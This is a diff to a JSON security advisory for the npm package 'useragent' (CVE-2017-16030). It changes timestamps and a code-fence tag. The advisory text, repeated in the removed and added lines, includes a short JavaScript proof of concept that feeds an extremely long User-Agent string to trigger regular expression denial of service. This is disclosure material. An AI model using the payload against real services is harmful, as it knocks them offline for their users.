@@ -1,6 +1,6 @@
 {
   "Severity": "HIGH",
-  "UpdatedAt": "2018-11-30T19:54:18Z",
+  "UpdatedAt": "2023-09-06T20:07:59Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "useragent"
@@ -30,12 +30,12 @@
         "Value": "CVE-2017-16030"
       }
     ],
-    "Description": "Affected versions of `useragent` are vulnerable to regular expression denial of service when an arbitrarily long `User-Agent` header is parsed.\n\n\n## Proof of Concept\n```\nvar useragent = require('useragent');\n\nvar badUserAgent = 'MSIE 0.0'+Array(900000).join('0')+'XBLWP';\nvar request = 'GET / HTTP/1.1\\r\\nUser-Agent: ' + badUserAgent + '\\r\\n\\r\\n';\nconsole.log(useragent.parse(request));\n```\n\n\n## Recommendation\n\nUpdate to version 2.1.13 or later.",
+    "Description": "Affected versions of `useragent` are vulnerable to regular expression denial of service when an arbitrarily long `User-Agent` header is parsed.\n\n\n## Proof of Concept\n```js\nvar useragent = require('useragent');\n\nvar badUserAgent = 'MSIE 0.0'+Array(900000).join('0')+'XBLWP';\nvar request = 'GET / HTTP/1.1\\r\\nUser-Agent: ' + badUserAgent + '\\r\\n\\r\\n';\nconsole.log(useragent.parse(request));\n```\n\n\n## Recommendation\n\nUpdate to version 2.1.13 or later.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2018-07-24T19:59:13Z",
     "Severity": "HIGH",
     "Summary": "ReDoS via long UserAgent header in useragent",
-    "UpdatedAt": "2023-01-09T05:03:12Z",
+    "UpdatedAt": "2023-09-06T20:07:59Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 0,
